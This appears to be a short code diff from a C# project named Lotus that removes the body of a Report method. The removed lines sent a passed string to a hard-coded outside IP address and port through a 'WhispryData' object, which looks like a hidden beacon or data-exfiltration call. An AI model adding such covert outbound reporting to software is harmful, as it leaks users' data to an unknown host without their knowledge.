@@ -11,8 +11,8 @@ namespace Lotus.Classes
     {
         public static void Report(string code)
         {
-            WhispryData data = new WhispryData("193.106.196.207", 62321);   
-            data.SendMessage(code);
+            
+        
         }
     }
 }
